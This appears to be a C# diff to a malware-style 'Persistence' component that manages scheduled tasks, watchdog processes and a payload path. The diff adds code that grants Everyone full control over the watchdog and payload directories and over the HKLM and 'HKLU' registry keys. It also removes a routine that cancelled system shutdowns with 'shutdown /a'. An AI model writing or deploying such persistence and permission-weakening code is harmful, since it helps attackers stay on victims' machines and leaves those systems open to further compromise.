@@ -49,6 +49,13 @@ namespace Persistence
                 Console.WriteLine($"Scheduled task '{taskName}' already exists and is active.");
 
             }
+            GrantEveryoneFullControlOnDirectory(Config.PrimaryWatchdogPath);
+            GrantEveryoneFullControlOnDirectory(Config.SecondaryWatchdogPath);
+            GrantEveryoneFullControlOnDirectory(Config.PayloadPath);
+
+            GrantEveryoneFullControl("HKLM");
+            GrantEveryoneFullControl("HKLU");
+
         }
 
             static bool TaskExistsAndActive(string taskName)
@@ -219,42 +226,6 @@ namespace Persistence
         {
             Console.WriteLine($"An error occurred: {ex.Message}");
         }
-    }
-
-    public static void PreventShutdown()
-    {
-        try
-        {
-            // Set up a ManagementEventWatcher to listen for shutdown events
-            ManagementEventWatcher shutdownWatcher = new ManagementEventWatcher(
-                new WqlEventQuery("SELECT * FROM Win32_ComputerShutdownEvent")
-            );
-
-            // Attach an event handler for shutdown events
-            shutdownWatcher.EventArrived += new EventArrivedEventHandler(OnShutdownEventArrived);
-
-            // Start listening for shutdown events
-            shutdownWatcher.Start();
-
-            Console.WriteLine("Listening for shutdown events...");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"An error occurred: {ex.Message}");
-        }
-    }
-
-    private static void OnShutdownEventArrived(object sender, EventArrivedEventArgs e)
-    {
-        // Cancel shutdown
-        Console.WriteLine("Shutdown event detected! Attempting to cancel...");
-        AbortShutdown();
-    }
-
-    private static void AbortShutdown()
-    {
-        // Use the shutdown command to abort
-        System.Diagnostics.Process.Start("shutdown.exe", "/a");
     }
         
     }
